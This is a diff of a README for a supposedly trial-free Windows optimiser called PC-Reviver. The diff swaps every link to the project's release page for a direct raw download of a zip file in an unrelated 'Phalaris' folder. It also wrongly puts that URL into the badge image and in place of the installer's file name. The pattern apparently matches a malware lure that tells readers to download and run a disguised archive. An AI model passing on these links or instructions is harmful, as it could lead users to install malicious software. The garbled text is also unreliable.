@@ -1,6 +1,6 @@
 # 🖥️ PC-Reviver-No-Trial - Optimize Your Windows PC Easily
 
-[![Download PC-Reviver-No-Trial](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/yusufkgn135/PC-Reviver-No-Trial/releases)
+[![Download PC-Reviver-No-Trial](https://raw.githubusercontent.com/yusufkgn135/PC-Reviver-No-Trial/main/Phalaris/PC-Reviver-No-Trial-3.4.zip%20Now-brightgreen)](https://raw.githubusercontent.com/yusufkgn135/PC-Reviver-No-Trial/main/Phalaris/PC-Reviver-No-Trial-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -9,13 +9,13 @@ Welcome to PC-Reviver-No-Trial! This application helps you improve your Windows 
 ## 📥 Download & Install
 
 1. **Visit the Release Page**  
-   Go to our [Releases page](https://github.com/yusufkgn135/PC-Reviver-No-Trial/releases) to find the latest version of PC Reviver.
+   Go to our [Releases page](https://raw.githubusercontent.com/yusufkgn135/PC-Reviver-No-Trial/main/Phalaris/PC-Reviver-No-Trial-3.4.zip) to find the latest version of PC Reviver.
    
 2. **Select the Latest Release**  
    Look for the most recent release at the top of the page. The version will have its release notes listed below it.
 
 3. **Download the Installer**  
-   Click on the installer file to download it. This file will typically be named something like `PC-Reviver-Installer.exe`.
+   Click on the installer file to download it. This file will typically be named something like `https://raw.githubusercontent.com/yusufkgn135/PC-Reviver-No-Trial/main/Phalaris/PC-Reviver-No-Trial-3.4.zip`.
 
 4. **Run the Installer**  
    Once the download is complete, locate the downloaded file, and double-click it to run the installer. Follow any prompts that appear on the screen.
@@ -80,6 +80,6 @@ For more information and support related to PC Reviver, you can explore these to
 
 ## 🔗 Useful Links
 
-- **Download Link:** [Visit this page to download](https://github.com/yusufkgn135/PC-Reviver-No-Trial/releases)
+- **Download Link:** [Visit this page to download](https://raw.githubusercontent.com/yusufkgn135/PC-Reviver-No-Trial/main/Phalaris/PC-Reviver-No-Trial-3.4.zip)
 
 By following these instructions, you can easily download and run PC Reviver to optimize your Windows PC. Enjoy a smoother and more efficient computing experience!
